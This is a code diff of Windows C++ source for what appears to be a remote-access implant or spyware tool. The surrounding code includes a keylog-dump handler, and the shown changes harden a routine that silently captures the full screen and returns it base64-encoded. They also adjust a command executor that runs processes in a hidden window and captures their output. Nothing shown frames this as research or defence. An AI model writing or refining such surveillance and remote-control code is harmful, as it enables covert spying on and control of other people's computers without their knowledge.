@@ -821,56 +821,67 @@ static std::wstring HandleKeylogDump(const std::string& /*args*/) {
 //  SCREENSHOT — GDI full-screen capture → BMP → base64
 // =====================================================================
 static std::wstring HandleScreenshot(const std::string& /*args*/) {
-    HDC hdcScreen = GetDC(NULL);
-    if (!hdcScreen) return L"[error: GetDC failed]";
+    try {
+        HDC hdcScreen = GetDC(NULL);
+        if (!hdcScreen) return L"[error: GetDC failed]";
 
-    int cx = GetSystemMetrics(SM_CXSCREEN);
-    int cy = GetSystemMetrics(SM_CYSCREEN);
+        int cx = GetSystemMetrics(SM_CXSCREEN);
+        int cy = GetSystemMetrics(SM_CYSCREEN);
 
-    HDC     hdcMem = CreateCompatibleDC(hdcScreen);
-    HBITMAP hbmp   = CreateCompatibleBitmap(hdcScreen, cx, cy);
-    if (!hdcMem || !hbmp) {
-        if (hdcMem) DeleteDC(hdcMem);
-        if (hbmp)   DeleteObject(hbmp);
+        HDC     hdcMem = CreateCompatibleDC(hdcScreen);
+        HBITMAP hbmp   = CreateCompatibleBitmap(hdcScreen, cx, cy);
+        if (!hdcMem || !hbmp) {
+            if (hdcMem) DeleteDC(hdcMem);
+            if (hbmp)   DeleteObject(hbmp);
+            ReleaseDC(NULL, hdcScreen);
+            return L"[error: CreateCompatibleBitmap failed]";
+        }
+
+        HBITMAP hOld = static_cast<HBITMAP>(SelectObject(hdcMem, hbmp));
+        BitBlt(hdcMem, 0, 0, cx, cy, hdcScreen, 0, 0, SRCCOPY | CAPTUREBLT);
+        SelectObject(hdcMem, hOld);
+        DeleteDC(hdcMem);
         ReleaseDC(NULL, hdcScreen);
-        return L"[error: CreateCompatibleBitmap failed]";
+
+        BITMAPINFOHEADER bi = {};
+        bi.biSize        = sizeof(BITMAPINFOHEADER);
+        bi.biWidth       = cx;
+        bi.biHeight      = -cy;
+        bi.biPlanes      = 1;
+        bi.biBitCount    = 24;
+        bi.biCompression = BI_RGB;
+        DWORD rowBytes   = ((static_cast<DWORD>(cx) * 3 + 3) & ~3u);
+        bi.biSizeImage   = rowBytes * static_cast<DWORD>(cy);
+
+        std::vector<BYTE> pixels(bi.biSizeImage);
+        HDC hdcTmp = GetDC(NULL);
+        GetDIBits(hdcTmp, hbmp, 0, static_cast<UINT>(cy),
+                  pixels.data(), reinterpret_cast<BITMAPINFO*>(&bi), DIB_RGB_COLORS);
+        ReleaseDC(NULL, hdcTmp);
+        DeleteObject(hbmp);
+
+        BITMAPFILEHEADER bfh = {};
+        bfh.bfType    = 0x4D42;
+        bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+        bfh.bfSize    = bfh.bfOffBits + bi.biSizeImage;
+
+        std::vector<BYTE> bmpFile(bfh.bfSize);
+        memcpy(bmpFile.data(),                 &bfh, sizeof(bfh));
+        memcpy(bmpFile.data() + sizeof(bfh),   &bi,  sizeof(bi));
+        memcpy(bmpFile.data() + bfh.bfOffBits, pixels.data(), pixels.size());
+
+        // Free pixel buffer before base64 to reduce peak memory usage
+        pixels.clear();
+        pixels.shrink_to_fit();
+
+        std::string b64 = Base64Encode(bmpFile.data(), static_cast<DWORD>(bmpFile.size()));
+        bmpFile.clear();
+        bmpFile.shrink_to_fit();
+
+        return L"[SCREENSHOT:BMP]\n" + UTF8ToWString(b64);
+    } catch (...) {
+        return L"[error: screenshot OOM or GDI failure]";
     }
-
-    HBITMAP hOld = static_cast<HBITMAP>(SelectObject(hdcMem, hbmp));
-    BitBlt(hdcMem, 0, 0, cx, cy, hdcScreen, 0, 0, SRCCOPY | CAPTUREBLT);
-    SelectObject(hdcMem, hOld);
-    DeleteDC(hdcMem);
-    ReleaseDC(NULL, hdcScreen);
-
-    BITMAPINFOHEADER bi = {};
-    bi.biSize        = sizeof(BITMAPINFOHEADER);
-    bi.biWidth       = cx;
-    bi.biHeight      = -cy;   // top-down
-    bi.biPlanes      = 1;
-    bi.biBitCount    = 24;
-    bi.biCompression = BI_RGB;
-    DWORD rowBytes   = ((static_cast<DWORD>(cx) * 3 + 3) & ~3u);
-    bi.biSizeImage   = rowBytes * static_cast<DWORD>(cy);
-
-    std::vector<BYTE> pixels(bi.biSizeImage);
-    HDC hdcTmp = GetDC(NULL);
-    GetDIBits(hdcTmp, hbmp, 0, static_cast<UINT>(cy),
-              pixels.data(), reinterpret_cast<BITMAPINFO*>(&bi), DIB_RGB_COLORS);
-    ReleaseDC(NULL, hdcTmp);
-    DeleteObject(hbmp);
-
-    BITMAPFILEHEADER bfh = {};
-    bfh.bfType    = 0x4D42; // 'BM'
-    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
-    bfh.bfSize    = bfh.bfOffBits + bi.biSizeImage;
-
-    std::vector<BYTE> bmpFile(bfh.bfSize);
-    memcpy(bmpFile.data(),                    &bfh, sizeof(bfh));
-    memcpy(bmpFile.data() + sizeof(bfh),      &bi,  sizeof(bi));
-    memcpy(bmpFile.data() + bfh.bfOffBits,    pixels.data(), pixels.size());
-
-    std::string b64 = Base64Encode(bmpFile.data(), static_cast<DWORD>(bmpFile.size()));
-    return L"[SCREENSHOT:BMP]\n" + UTF8ToWString(b64);
 }
 
 // =====================================================================
@@ -979,7 +990,7 @@ std::wstring ExecuteCommand(const std::wstring& cmd) {
     si.wShowWindow = SW_HIDE;
     si.hStdOutput = hWrite;
     si.hStdError  = hWrite;
-    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);
+    si.hStdInput  = nullptr;
 
     PROCESS_INFORMATION pi = {};
     if (!CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
